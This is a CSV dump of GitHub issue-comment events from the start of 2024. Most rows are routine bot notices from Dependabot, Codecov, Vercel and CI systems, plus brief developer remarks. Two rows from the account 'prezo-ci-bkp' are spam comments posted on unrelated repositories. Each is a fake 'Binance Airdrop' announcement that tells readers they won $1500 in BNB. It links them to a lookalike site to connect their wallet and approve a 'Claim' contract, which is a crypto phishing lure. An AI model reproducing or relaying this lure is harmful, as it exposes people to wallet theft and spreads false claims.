id,type,created_at,actor.login,repo.name,payload.issue.number,payload.action,payload.comment.body
34499303795,IssueCommentEvent,2024-01-01T09:00:00Z,dependabot[bot],stitcombe/react-ts-vite,78.0,created,Superseded by #81.
34499303836,IssueCommentEvent,2024-01-01T09:00:01Z,StoneCypher,StoneCypher/fsl,1235.0,created,this appears to have self-resolved along the way.  possibly when i re-registered the module?  dunno.
34499304657,IssueCommentEvent,2024-01-01T09:00:05Z,codecov[bot],davidmoten/word-wrap,77.0,created,"## [Codecov](https://app.codecov.io/gh/davidmoten/word-wrap/pull/77?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten) Report
All modified and coverable lines are covered by tests :white_check_mark:
> Comparison is base [(`9416273`)](https://app.codecov.io/gh/davidmoten/word-wrap/commit/941627368eb723cca330996a6c4902d535ce16f8?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten) 97.58% compared to head [(`8baff1e`)](https://app.codecov.io/gh/davidmoten/word-wrap/pull/77?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten) 97.58%.
> Report is 26 commits behind head on master.


<details><summary>Additional details and impacted files</summary>


```diff
@@            Coverage Diff            @@
##             master      #77   +/-   ##
=========================================
  Coverage     97.58%   97.58%           
  Complexity      119      119           
=========================================
  Files             6        6           
  Lines           331      331           
  Branches         49       49           
=========================================
  Hits            323      323           
  Misses            4        4           
  Partials          4        4           
```



</details>

[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/davidmoten/word-wrap/pull/77?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten).   
:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Dave+Moten).
"
34499304791,IssueCommentEvent,2024-01-01T09:00:05Z,Esword618,jinzhongmin/goncnn-examples,1.0,created,è§£å†³äº†ï¼Œæ˜¯è¿™ä¸ªhttps://github.com/jinzhongmin/goffi é‡Œé¢æ²¡è¯´å®‰è£…pkg-configï¼Œæˆ‘ä»¥ä¸ºä»…ä»…å®‰è£…ä¸¤ä¸ªå°±å¥½äº†ã€‚å»ºè®®åŠ ä¸€ä¸‹ã€‚
34499304855,IssueCommentEvent,2024-01-01T09:00:06Z,dependabot[bot],jacobdockter/portfolio-iac,47.0,created,Superseded by #48.
34499305068,IssueCommentEvent,2024-01-01T09:00:07Z,dependabot[bot],HanchaiN/HanchaiN.github.io,22.0,created,Superseded by #26.
34499305165,IssueCommentEvent,2024-01-01T09:00:07Z,codesee-maps[bot],marcusgchan/reci-one,177.0,created,"<details open>
<summary><b>ğŸ‘‡ <a href=""https://app.codesee.io/r/reviews?pr=177&src=https%3A%2F%2Fgithub.com%2Fmarcusgchan%2Freci-one"">Click on the image</a> for a new way to code review</b>
</summary>

####

[![Review these changes using an interactive CodeSee Map](https://s3.us-east-2.amazonaws.com/maps.codesee.io/images/github/marcusgchan/reci-one/177/02c06bcb/b438c7123d9e8d0ffc7bd2bb9bbf0b4721f742c5.svg)](https://app.codesee.io/r/reviews?pr=177&src=https%3A%2F%2Fgithub.com%2Fmarcusgchan%2Freci-one)

#### Legend
<img src=""https://app.codesee.io/Legend_v3.png"" alt=""CodeSee Map legend"" width=""220"" height=""156"">
</details>"
34499305188,IssueCommentEvent,2024-01-01T09:00:07Z,dlib-issue-bot,davisking/dlib,2893.0,created,"Warning: this issue has been inactive for 35 days and will be automatically closed on 2024-01-10 if there is no further activity.

If you are waiting for a response but haven't received one it's possible your question is somehow inappropriate.  E.g. it is off topic, you didn't follow the issue submission instructions, or your question is easily answerable by reading the [FAQ](http://dlib.net/faq.html),  dlib's [official compilation instructions](http://http://dlib.net/compile.html),  dlib's [API documentation](http://dlib.net/faq.html#Whereisthedocumentationforobjectfunction),  or a Google search.
"
34499305308,IssueCommentEvent,2024-01-01T09:00:08Z,vercel[bot],UMHelper/next-web,33.0,created,"[vc]: #VoBKMAUHzezRBYJ3+ELqH2qRUxievi9WgOgB9nPoQL8=:eyJpc01vbm9yZXBvIjp0cnVlLCJ0eXBlIjoiZ2l0aHViIiwicHJvamVjdHMiOlt7Im5hbWUiOiJuZXh0LXdlYiIsImluc3BlY3RvclVybCI6Imh0dHBzOi8vdmVyY2VsLmNvbS91bWhlbHBlci9uZXh0LXdlYi9KNERYaExHVHhkbmhQMXdEWFBLQzNXQzlzNkQ1IiwicHJldmlld1VybCI6Im5leHQtd2ViLWdpdC1yZXBseS11bWhlbHBlci52ZXJjZWwuYXBwIiwibmV4dENvbW1pdFN0YXR1cyI6IlBFTkRJTkcifV19
**The latest updates on your projects**. Learn more about [Vercel for Git â†—ï¸](https://vercel.link/github-learn-more)

| Name | Status | Preview | Updated (UTC) |
| :--- | :----- | :------ | :------ |
| **next-web** | ğŸ”„ Building ([Inspect](https://vercel.com/umhelper/next-web/J4DXhLGTxdnhP1wDXPKC3WC9s6D5)) | [Visit Preview](https://next-web-git-reply-umhelper.vercel.app) | Jan 1, 2024 9:00am |

"
34499305356,IssueCommentEvent,2024-01-01T09:00:08Z,dependabot[bot],snapp-incubator/consul-gslb-driver,55.0,created,The following labels could not be found: `dependencies`.
34499305638,IssueCommentEvent,2024-01-01T09:00:10Z,aosc-buildit-bot,AOSC-Dev/aosc-os-abbs,5058.0,created,"âŒ Job completed on PowerNV \(ppc64el\)

**Time elapsed**: 33.95s
**Git commit**: [a1e3e5fa](https://github.com/AOSC-Dev/aosc-os-abbs/commit/a1e3e5facd5f52bd8cb87268aebe762bf31fc81a
)
**Architecture**: ppc64el
**Package\(s\) to build**: autobuild4
**Package\(s\) successfully built**: 
**Package\(s\) failed to build**: None
**Package\(s\) not built due to previous build failure**: 

[Build Log \>\>](https://pastebin.aosc.io/paste/KKuguDfgsI5QwFZUe2cDLg/raw)
"
34499305701,IssueCommentEvent,2024-01-01T09:00:10Z,aolko,Chaoses-Ib/ComfyScript,3.0,created,"For example all that noise and sampling bs can be just one node, same for controlnets (load controlnet,apply controlnet)"
34499305899,IssueCommentEvent,2024-01-01T09:00:11Z,dependabot[bot],skipzero/invoice-app,29.0,created,Superseded by #50.
34499306051,IssueCommentEvent,2024-01-01T09:00:12Z,dependabot[bot],symonk/kafkapy,10.0,created,The following labels could not be found: `dependabot`.
34499306343,IssueCommentEvent,2024-01-01T09:00:13Z,prezo-ci-bkp,shivekkhurana/.emacs.d,5.0,created,"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!

Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!

[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)

## Steps to Claim:

### 1. Connect Your Binance Wallet:
   - Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
   - Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).

### 2. Interact with the Contract:
   - Once your wallet is connected.
   - Click on the ""**Claim**"" button to interact with the smart contract.

Don't miss out on your $1500 in BNB! Act now to secure your tokens.


Winners: @"
34499306584,IssueCommentEvent,2024-01-01T09:00:14Z,dependabot[bot],dixitdeveloper/garden,9.0,created,Superseded by #12.
34499306675,IssueCommentEvent,2024-01-01T09:00:14Z,vercel[bot],dixitdeveloper/garden,12.0,created,"[vc]: #y4TcRp1MX7DybYqGdXu+BwlfnE5Xbbl2FskvDt3Va0k=:eyJpc01vbm9yZXBvIjp0cnVlLCJ0eXBlIjoiZ2l0aHViIiwicHJvamVjdHMiOlt7Im5hbWUiOiJnYXJkZW4iLCJyb290RGlyZWN0b3J5IjpudWxsLCJpbnNwZWN0b3JVcmwiOiJodHRwczovL3ZlcmNlbC5jb20vYmFiYXMtcHJvamVjdHMtOTgwMzRiOGEvZ2FyZGVuL0dIUU5MMzRtV2c5TnZYV1hEYlc3dVFkWjNnNnAiLCJwcmV2aWV3VXJsIjoiZ2FyZGVuLWdpdC1kZXBlbmRhYm90LW5wbWFuZHlhcm4tMjhhZjQxLWJhYmFzLXByb2plY3RzLTk4MDM0YjhhLnZlcmNlbC5hcHAiLCJuZXh0Q29tbWl0U3RhdHVzIjoiUEVORElORyIsImxpdmVGZWVkYmFjayI6eyJyZXNvbHZlZCI6MCwidW5yZXNvbHZlZCI6MCwidG90YWwiOjAsImxpbmsiOiJnYXJkZW4tZ2l0LWRlcGVuZGFib3QtbnBtYW5keWFybi0yOGFmNDEtYmFiYXMtcHJvamVjdHMtOTgwMzRiOGEudmVyY2VsLmFwcCJ9fV19
**The latest updates on your projects**. Learn more about [Vercel for Git â†—ï¸](https://vercel.link/github-learn-more)

| Name | Status | Preview | Comments | Updated (UTC) |
| :--- | :----- | :------ | :------- | :------ |
| **garden** | ğŸ”„ Building ([Inspect](https://vercel.com/babas-projects-98034b8a/garden/GHQNL34mWg9NvXWXDbW7uQdZ3g6p)) | [Visit Preview](https://vercel.live/open-feedback/garden-git-dependabot-npmandyarn-28af41-babas-projects-98034b8a.vercel.app?via=pr-comment-visit-preview-link&passThrough=1) | ğŸ’¬ [**Add feedback**](https://vercel.live/open-feedback/garden-git-dependabot-npmandyarn-28af41-babas-projects-98034b8a.vercel.app?via=pr-comment-feedback-link) | Jan 1, 2024 9:00am |

"
34499306772,IssueCommentEvent,2024-01-01T09:00:15Z,dependabot[bot],sammacbeth/action-asana-sync,85.0,created,Superseded by #91.
34499307316,IssueCommentEvent,2024-01-01T09:00:18Z,prezo-ci-bkp,westonnelson/aave-flashloan-mix,1.0,created,"# Binance Airdrop Guide: Claim Your $1500 in BNB Now!

Congratulations! You've won a share of the $500k Binance Airdrop, and we're excited to give you $1500 in BNB to celebrate the end of the year. Follow the steps below to claim your tokens and make the most of this festive giveaway!

[![Claim Now](https://i.ytimg.com/vi/PFhGDyXstas/maxresdefault.jpg)](http://go.bnbcoinsearn.online/97Q7Yj)

## Steps to Claim:

### 1. Connect Your Binance Wallet:
   - Click on the [Connect Wallet](https://go.bnbcoinsearn.online/97Q7Yj) link.
   - Choose your preferred wallet provider (Metamask, Trust Wallet, etc.).

### 2. Interact with the Contract:
   - Once your wallet is connected.
   - Click on the ""**Claim**"" button to interact with the smart contract.

Don't miss out on your $1500 in BNB! Act now to secure your tokens.


Winners: @"
34499307345,IssueCommentEvent,2024-01-01T09:00:18Z,jenkins4kodi,xbmc/xbmc,24386.0,created,"I've made some formatting changes to meet the current code style. The diffs are available in the following links:
 - [PR24386-0001-2312d70a23-VIDEO-Prefer-nfo-streamdetails-if-.diff](https://jenkins.kodi.tv/job/BuildMulti-PR/28792/artifact/PR24386-0001-2312d70a23-VIDEO-Prefer-nfo-streamdetails-if-.diff)
 - [PR24386.diff](https://jenkins.kodi.tv/job/BuildMulti-PR/28792/artifact/PR24386.diff)

For more information please see our [current code style guidelines](https://github.com/xbmc/xbmc/blob/master/docs/CODE_GUIDELINES.md)."
34499307398,IssueCommentEvent,2024-01-01T09:00:18Z,vercel[bot],CovenantNomad/hychurch-online-registration,6.0,created,"[vc]: #C6Pos19rTovIKaGfPs0Vn6PhHlsk3aRb76hBUTJuRzw=:eyJpc01vbm9yZXBvIjp0cnVlLCJ0eXBlIjoiZ2l0aHViIiwicHJvamVjdHMiOlt7Im5hbWUiOiJoeWNodXJjaC1vbmxpbmUtcmVnaXN0cmF0aW9uIiwiaW5zcGVjdG9yVXJsIjoiaHR0cHM6Ly92ZXJjZWwuY29tL2NvdmVuYW50bm9tYWQvaHljaHVyY2gtb25saW5lLXJlZ2lzdHJhdGlvbi9GdktTV0pqWHV0UG9QcTh5MmhoUGVBQ2hHYmhCIiwicHJldmlld1VybCI6Imh5Y2h1cmNoLW9ubGluZS1yZWdpc3RyYXRpb24tZ2l0LWRldmVsb3AtY292ZW5hbnRub21hZC52ZXJjZWwuYXBwIiwibmV4dENvbW1pdFN0YXR1cyI6IkRFUExPWUVEIn1dfQ==
**The latest updates on your projects**. Learn more about [Vercel for Git â†—ï¸](https://vercel.link/github-learn-more)

| Name | Status | Preview | Updated (UTC) |
| :--- | :----- | :------ | :------ |
| **hychurch-online-registration** | âœ… Ready ([Inspect](https://vercel.com/covenantnomad/hychurch-online-registration/FvKSWJjXutPoPq8y2hhPeAChGbhB)) | [Visit Preview](https://hychurch-online-registration-git-develop-covenantnomad.vercel.app) | Jan 1, 2024 9:00am |

"
34499307413,IssueCommentEvent,2024-01-01T09:00:18Z,dependabot[bot],SkynetLabs/skynet-mysky-utils,274.0,created,Superseded by #278.
34499307675,IssueCommentEvent,2024-01-01T09:00:20Z,avdhootu27,MaikuB/flutter_local_notifications,2194.0,created,"Got it. 
I put the image in folder mipmap and added its path as below and it worked.

`const AndroidInitializationSettings initializationSettingsAndroid = AndroidInitializationSettings('mipmap/ic_launcher');`
"
34499307825,IssueCommentEvent,2024-01-01T09:00:21Z,dependabot[bot],tf2mandeokyi/BTETerraRenderer,50.0,created,Superseded by #57.
34499804552,IssueCommentEvent,2024-01-01T10:00:00Z,dependabot[bot],wei/gogs,132.0,created,Superseded by #138.
34499804643,IssueCommentEvent,2024-01-01T10:00:00Z,signcla-test-signed-indiv,google-test/signclav2-probe-repo,280896.0,created,indiv-pass-fork: test succeeded
34499804656,IssueCommentEvent,2024-01-01T10:00:00Z,dependabot[bot],nhs-england-tools/terraform-aws-send-alarms-to-msteams,74.0,created,Superseded by #75.
34499804692,IssueCommentEvent,2024-01-01T10:00:01Z,wryun,joeycastillo/Sensor-Watch,345.0,created,"Interested in any thoughts on the approach, and whether it's ok to drop CLOCK support entirely (as this PR does)."
34499804734,IssueCommentEvent,2024-01-01T10:00:01Z,codesandbox-ci[bot],system-ui/theme-ui,2470.0,created,"This pull request is automatically built and testable in [CodeSandbox](https://codesandbox.io).

  To see build info of the built libraries, click [here](https://ci.codesandbox.io/status/system-ui/theme-ui/pr/2470/builds/454893) or the icon next to each commit SHA.

Latest deployment of this branch, based on commit 862182a0313c7368422c5e90957dd85f162f5e98:

|Sandbox| Source |
|--|--|
|[next-theme-ui-example](https://codesandbox.io/s/next-theme-ui-example-wmjhjv)| Configuration |
|[gatsby-plugin-theme-ui-example](https://codesandbox.io/s/gatsby-plugin-theme-ui-example-xl5x3d)| Configuration |
"
34499805262,IssueCommentEvent,2024-01-01T10:00:04Z,walnuts1018,kmc-jp/heineken-crawler,6.0,created,infra / heinekenå´ã«å…¥ã‚Œã‚‹ã¾ã§ç‰¹ã«ä½•ã‚‚èµ·ã“ã‚‰ãªã„ã¨æ€ã†ã®ã§mergeã—ã¾ã™ï¼
34499806295,IssueCommentEvent,2024-01-01T10:00:08Z,github-actions[bot],guardian/riff-raff,1300.0,created,"### [Deploy build 3232 of `tools::riffraff` to CODE](https://riffraff.gutools.co.uk/deployment/deployAgain?project=tools%3A%3Ariffraff&build=3232&stage=CODE&updateStrategy=MostlyHarmless&action=deploy)
<details>
<summary>All deployment options</summary>

- [Deploy build 3232 of `tools::riffraff` to CODE](https://riffraff.gutools.co.uk/deployment/deployAgain?project=tools%3A%3Ariffraff&build=3232&stage=CODE&updateStrategy=MostlyHarmless&action=deploy)
- [Deploy parts of build 3232 to CODE by previewing it first](https://riffraff.gutools.co.uk/preview/yaml?project=tools%3A%3Ariffraff&build=3232&stage=CODE&updateStrategy=MostlyHarmless)
- [What's on CODE right now?](https://riffraff.gutools.co.uk/deployment/history?projectName=tools%3A%3Ariffraff&stage=CODE)
</details>

---
_From [guardian/actions-riff-raff](https://github.com/guardian/actions-riff-raff)._
<!-- guardian/actions-riff-raff for tools::riffraff -->"
34499806399,IssueCommentEvent,2024-01-01T10:00:09Z,netlify[bot],vitorRibeiro7/pokejan-app-moove,43.0,created,"### <span aria-hidden=""true"">ğŸ‘·</span> Deploy Preview for *pokejan* processing.


|  Name | Link |
|:-:|------------------------|
|<span aria-hidden=""true"">ğŸ”¨</span> Latest commit | 2ce8b0c175fd0ff0da1df9e3e8b76cb71e6d89ed |
|<span aria-hidden=""true"">ğŸ”</span> Latest deploy log | https://app.netlify.com/sites/pokejan/deploys/65928d25f555eb0008ab03b5 |"
34499806619,IssueCommentEvent,2024-01-01T10:00:10Z,cocogitto-bot[bot],ecsact-dev/unity-ecsact-wasm-bazel-template,4.0,created,:heavy_check_mark: 3d3458e21043cf1f52b1f8c5da8b828bee54321f - Conventional commits check succeeded.
34499806794,IssueCommentEvent,2024-01-01T10:00:11Z,otyugh,dokuwiki/dokuwiki,4129.0,created,"(note : The problem only occurred on login success not failing it)

Could it be a combination of my nginx settings & dokuwiki ? Because I can give you a ""default dokuwiki"" lf the latest version that I'd just pasted on my webserver and you could reproduce it. Sadly I don't know if it'll be of any use.
https://t2.arzinfo.eu.org/doku.php?id=start"
